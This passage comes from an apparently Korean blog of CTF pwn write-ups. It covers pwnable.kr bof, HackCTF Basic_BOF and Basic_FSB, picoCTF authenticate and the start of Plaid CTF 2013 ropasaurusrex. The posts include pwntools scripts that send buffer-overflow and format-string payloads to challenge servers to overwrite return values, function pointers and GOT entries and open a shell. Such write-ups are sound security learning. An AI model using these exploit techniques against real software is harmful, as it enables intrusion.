같습니다.</strong><br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-25%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%206.16.07.png?raw=true"></p><p><strong>func 중간에 브레이크 포인트를 걸어 key의 주소를 확인해보면 13 + 4 = 52만큼 떨어져 있는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;pwnable.kr&quot;</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">52</span></span><br><span class="line">payload += p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : daddy, I just pwned a buFFer :)</p></blockquote><hr><p>HackCTF Challenge : Basic_BOF #1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0x4030201</span>;</span><br><span class="line">  fgets(&amp;s, <span class="number">45</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[buf]: %s\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[check] %p\n&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">0x4030201</span> &amp;&amp; v5 != <span class="number">0xDEADBEEF</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nYou are on the right way!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Yeah dude! You win!\nOpening your shell...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/dash&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Shell closed! Bye.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>따로 .c 파일이 주어지지 않아 IDA를 이용해서 코드로 변환해보니, v5의 값이 <code>0xDEADBEEF</code>면 system 함수를 호출하는 것을 볼 수 있습니다. 이번 문제도 BOF를 이용해서 v5의 값을 <code>0xDEADBEEF</code>로 바꿔주면 될 거 같습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v5  &#x3D; 34h - Ch</span><br><span class="line">v5 &#x3D; 40</span><br></pre></td></tr></table></figure><p><strong>v5는 s와 40만큼 떨어져 있다는 것을 알 수 있습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">52</span> - <span class="number">12</span>)</span><br><span class="line">payload += p32(<span class="number">0xDEADBEEF</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{f1r57_574ck_buff3r_0v3rfl0w_5ucc355}</p></blockquote><hr><p>HackCTF Challenge : Basic_BOF #2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">void</span> (*v5)(<span class="keyword">void</span>); <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = (<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sup;</span><br><span class="line">  fgets(&amp;s, <span class="number">133</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v5();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(...)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/dash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// shell addr : 0x804849B</span></span><br></pre></td></tr></table></figure><p><strong>1번과 마찬가치로 IDA를 이용해서 코드로 변환해주었습니다. 코드를 보니 문자열 변수 s와 함수 포인터 v5를 정의하는 것을 볼 수 있습니다. 그리고 마지막에는 v5 함수를 호출하고 있습니다. BOF 취약점을 이용해서 v5 포인터 변수의 값으로 shell 함수의 주소를 넣어주면 v5 함수를 호출 할 때 shell 함수가 호출이 될 것 입니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*v5 &#x3D; 8Ch - Ch</span><br><span class="line">*v5 &#x3D; 128</span><br></pre></td></tr></table></figure><p><strong>*v5는 s와 128만큼 떨어져 있다는 것을 알 수 있습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3001</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">128</span></span><br><span class="line">payload += p32(<span class="number">0x804849B</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{h3y_dud3_600d_f0r_y0u}</p></blockquote><hr><p>HackCTF Challenge : Basic_FSB</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vuln</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-808h]</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+400h] [ebp-408h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input : &quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;format, <span class="number">0x400</span>u, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;EN)you have successfully modified the value :)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aKr);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>IDA를 이용해서 코드로 변환을 해주었습니다. main 함수를 보면 vuln 함수를 호출하고 있고, vulln 함수를 보면 snprintf 함수에서 두 번째 매개변수로 서식 문자가 정의되어 있지 않아 FSB 취약점이 발생합니다. 그래서 FSB 취약점을 이용해서 printf 함수의 got를 flag 함수의 주소로 덮어주면 printf 함수가 실행될 때, flag 함수가 실행이 될 것 입니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@py:~&#x2F;pwn&#x2F;HackCTF&#x2F;B_F# .&#x2F;basic_fsb</span><br><span class="line">input : aaaa.%x.%x.%x.%x.%x</span><br><span class="line">aaaa.f7fc5c75.61616161.2e78252e.252e7825.78252e78</span><br><span class="line">root@py:~&#x2F;pwn&#x2F;HackCTF&#x2F;B_F#</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; gdb -q .&#x2F;basic_fsb</span><br><span class="line">gdb-peda$ x&#x2F;i 0x80483d0</span><br><span class="line">   0x80483d0 &lt;printf@plt&gt;:      jmp    DWORD PTR ds:0x804a00c</span><br><span class="line">gdb-peda$ p flag</span><br><span class="line">$2 &#x3D; &#123;&lt;text variable, no debug info&gt;&#125; 0x80485b4 &lt;flag&gt;</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure><p><strong>바이너리 파일을 실행해서 오프셋을 확인해보니 두 번째 서식 문자에서 <code>aaaa</code>의 값이 출력되는 것을 볼 수 있고, printf got, flag 함수의 주소는 위와 같습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3002</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">2</span>, &#123;<span class="number">0x804a00c</span>:<span class="number">0x80485b4</span>&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32 비트에서는 fmtstr_payload 함수를 이용해도 잘 되지만 64 비트에서는 거의 안 됨.</span></span><br><span class="line"><span class="comment"># 처음 풀 때 어려워 했는데 이해하고 다시 보니, webhacking.kr 1번 문제 느낌.</span></span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{여보게_오늘_반찬은_포맷스트링이_어떠한가?}</p></blockquote><hr><p>PicoCTF Challenge : authenticate</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> authenticated = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">48</span>];</span><br><span class="line">  FILE *file;</span><br><span class="line">  file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(flag, <span class="keyword">sizeof</span>(flag), file);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!authenticated) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sorry, you are not *authenticated*!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Access Granted.\n&quot;</span>);</span><br><span class="line">    flag();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Would you like to read the flag? (yes/no)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;no&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay, Exiting...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;yes&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Received Unknown Input:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  read_flag();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>main 함수 else if 문을 보면 printf 함수를 호출하는 데 이때 FSB 취약점이 발생합니다. 그리고 flag는 read_flag 함수에서 authenticated의 값이 참이면 flag 함수를 호출해서 flag를 출력해줍니다. 즉 전역 변수인 authenticated의 값을 FSB 취약점을 이용해서 참(1)으로 변조하면 됩니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@py:~&#x2F;pwn&#x2F;picoCTF# .&#x2F;auth</span><br><span class="line">Would you like to read the flag? (yes&#x2F;no)</span><br><span class="line">aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x</span><br><span class="line">Received Unknown Input:</span><br><span class="line"></span><br><span class="line">aaaa.80489a6.f7ec1580.804875a.f7ec1000.ff992024.ff992028.ff9920f4.3.0.0.61616161.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.Sorry, you are not *authenticated*!</span><br></pre></td></tr></table></figure><p><strong>바이너리 파일을 이용해 오프셋을 확인해 보니 11인 것을 알 수 있었습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;2018shell2.picoctf.com&quot;</span>, <span class="number">52918</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./auth&quot;</span>)</span><br><span class="line">auth = e.sym[<span class="string">&#x27;authenticated&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>, &#123;auth:<span class="number">1</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_d29a706d}</p></blockquote><hr><h2 id="PWN-D-2-2021-01-26"><a href="#PWN-D-2-2021-01-26" class="headerlink" title="PWN D+2 (2021.01.26)"></a>PWN D+2 (2021.01.26)<br></h2><hr><p>Plaid CTF 2013 - Challenge : ropasaurusrex </p><p><strong>이번에 풀어 볼 문제는 Plaid CTF 2013에서 나온 32 bit ROP 문제입니다. 32 bit ROP를 이해하고, 풀어보니 포너블 뉴비분들은 재밌게 풀 수 있을 거 같습니다. 일단 IDA를 이용해서 바이너리를 코드로 변환 시켜 주겠습니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_80483F4();</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;WIN\n&quot;</span>, <span class="number">4u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>main() 함수를 보면 sub_80483F4() 함수를 호출하고, <code>WIN</code>을 출력하고 끝나는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_80483F4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+10h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sub_80483F4() 함수를 보면 buf라는 변수를 정의하고, read 함수를 이용해서 buf의 입력 받고 있습니다. 하지만 buf의 크기는 88h인데 read() 함수에세ㅓ 100h 만큼 입력 받고 있기 때문에 BOF 취약점이 발생합니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ .&#x2F;ropasaurusrex </span><br><span class="line">AAAA</span><br><span class="line">WIN</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ </span><br></pre></td></tr></table></figure><p><strong>위 결과는 바이너리 파일을 실행시킨 것 입니다. 입력을 받고, <code>WIN</code>을 출력함과 동시에 종료되는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ checksec --file&#x3D;ropasaurusrex</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILE</span><br><span class="line">No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols  No01ropasaurusrex</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ </span><br></pre></td></tr></table></figure><p><strong>위 결과는 checksec를 이용해 보호 기법을 확인한 결과인데, 보면 NX Bit가 활성화 되어 있는 것을 볼 수 있습니다. NX Bit가 활성화 되어 있기 때문에 BOF 취약점을 이용해서 buf에 쉘코드를 삽입하고, ret에 buf를 준다고해도 실행 권한이 없어 실행되지 않을 것 입니다. 하지만 ROP를 이용해서 NX Bit를 우회해 익스를 진행할 수 있습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disas read</span><br><span class="line">Dump of assembler code for function read@plt:</span><br><span class="line">   0x0804832c &lt;+0&gt;:jmp    DWORD PTR ds:0x804961c</span><br><span class="line">   0x08048332 &lt;+6&gt;:push   0x18</span><br><span class="line">   0x08048337 &lt;+11&gt;:jmp    0x80482ec</span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$ disas write</span><br><span class="line">Dump of assembler code for function write@plt:</span><br><span class="line">   0x0804830c &lt;+0&gt;:jmp    DWORD PTR ds:0x8049614</span><br><span class="line">   0x08048312 &lt;+6&gt;:push   0x8</span><br><span class="line">   0x08048317 &lt;+11&gt;:jmp    0x80482ec</span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; read got  : 0x0804961c</span><br><span class="line">&#x2F;&#x2F; read plt  : 0x0804832c</span><br><span class="line">&#x2F;&#x2F; write got : 0x08049614</span><br><span class="line">&#x2F;&#x2F; write plt : 0x0804830c</span><br></pre></td></tr></table></figure><p><strong>gdb를 이용해서 read/write의 plt/got를 알아냈습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ objdump -d ropasaurusrex | grep -B4 &quot;ret&quot;</span><br><span class="line">(생략)</span><br><span class="line">--</span><br><span class="line"> 80484b5:5b                   pop    %ebx</span><br><span class="line"> 80484b6:5e                   pop    %esi</span><br><span class="line"> 80484b7:5f                   pop    %edi</span><br><span class="line"> 80484b8:5d                   pop    %ebp</span><br><span class="line"> 80484b9:c3                   ret    </span><br><span class="line"> 80484ba:8b 1c 24             mov    (%esp),%ebx</span><br><span class="line"> 80484bd:c3                   ret    </span><br><span class="line">--</span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; pop pop pop r : 0x080484b6</span><br></pre></td></tr></table></figure><p><strong>objdump를 이용해서 pppr을 알아냈습니다 pppr을 구하는 이유는 read/write 함수의 인자는 3개이기 때문입니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ objdump -d 